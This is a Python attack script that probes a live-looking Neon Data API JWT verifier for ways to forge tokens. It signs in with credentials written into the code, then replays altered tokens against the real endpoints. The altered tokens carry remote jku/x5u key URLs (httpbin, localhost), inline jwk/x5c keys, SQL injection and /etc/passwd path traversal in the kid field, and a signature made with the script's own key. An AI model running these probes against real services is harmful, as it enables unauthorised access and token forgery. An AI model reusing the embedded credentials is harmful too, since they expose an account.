# -*- coding: utf-8 -*-
"""V12: Data API JWT verifier - jku/x5u/x5c/jwk header support probes.
Prior _n7 matrix tested alg/kid/role/exp only. If verifier honors jku (remote
JWKS fetch) -> arbitrary JWT forgery. Detection via ERROR DIFF:
- 'jwk not found'       = header ignored, local kid lookup only (safe)
- fetch/network errors  = jku honored (VULN candidate)
Also: kid SQLi/pathtraversal probes via error messages."""
import json, ssl, time, http.client, base64

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
AP = "ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def req(host, method, path, body=None, hdr=None, timeout=25):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=timeout)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json'}
        if hdr:
            h.update(hdr)
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        conn.close()
        return r.status, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}


def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.b64encode(s).decode().replace('+', '-').replace('/', '_').rstrip('=')


def dec(s):
    s2 = s.replace('-', '+').replace('_', '/')
    s2 += '=' * (-len(s2) % 4)
    return base64.b64decode(s2).decode('utf-8', 'replace')


def main():
    out("== V12 JWT jku/x5u/header-support probes ==")
    # fresh real JWT
    st, raw, hdrs1 = req(NA_HOST, 'POST', '/neondb/auth/sign-in/email',
                         {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'},
                         {'Origin': 'http://localhost:3000'})
    sc = hdrs1.get('set-cookie') or ''
    cookies = {}
    for part in sc.split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            cookies[k.strip()] = v.strip()
    ck = '; '.join('%s=%s' % (k, v) for k, v in cookies.items())
    st2, raw2, _ = req(NA_HOST, 'GET', '/neondb/auth/token', hdr={'Cookie': ck})
    jwt = json.loads(raw2).get('token', '')
    h_part, p_part, s_part = jwt.split('.')
    hdr_j = json.loads(dec(h_part))
    out("orig header: %s" % hdr_j)

    def probe(tag, new_header, new_sig=None):
        nh = dict(hdr_j)
        nh.update(new_header)
        sig = new_sig if new_sig is not None else s_part
        tok = b64u(json.dumps(nh)) + '.' + p_part + '.' + sig
        st3, raw3, _ = req(AP, 'GET', '/neondb/rest/v1/?select=*', hdr={'Authorization': 'Bearer ' + tok})
        out("%-46s -> %d %s" % (tag, st3, raw3[:180].replace('\n', ' ')))
        time.sleep(0.5)

    # baseline: real token ok; stripped header fields
    probe("A real token (ctrl)", {})
    probe("B jku->httpbin (remote)", {"jku": "https://httpbin.org/anything"})
    probe("C jku->127.0.0.1:1", {"jku": "https://127.0.0.1:1/jwks.json"})
    probe("D jku->own jwks", {"jku": "https://%s/neondb/.well-known/jwks.json" % NA_HOST})
    probe("E x5u->httpbin", {"x5u": "https://httpbin.org/cert"})
    probe("F x5c inline", {"x5c": ["MIIB"]})
    probe("G jwk inline", {"jwk": {"kty": "OKP", "crv": "Ed25519", "x": "AAAA"}})
    probe("H kid SQLi", {"kid": "6ab964bf-0000-0000-0000-000000000000' OR '1'='1"})
    probe("I kid path trav", {"kid": "../../../../etc/passwd"})
    probe("J kid long", {"kid": "A" * 5000})
    probe("K typ confusion", {"typ": "JWT", "cty": "JWT"})
    probe("L alg=EdDSA kid empty", {"kid": ""})
    probe("M crit header", {"crit": ["jku"], "jku": "https://httpbin.org/anything"})
    # signature forged with own ed25519 key + kid pointing to real kid
    try:
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        priv = Ed25519PrivateKey.generate()
        fake_sig = priv.sign((b64u(json.dumps(dict(hdr_j, jku="https://httpbin.org/anything"))) + '.' + p_part).encode())
        probe("N forged sig + jku", {"jku": "https://httpbin.org/anything"}, base64.b64encode(fake_sig).decode().rstrip('='))
    except Exception as e:
        out("N crypto skip: %s" % str(e)[:80])
    out("done")


if __name__ == "__main__":
    main()
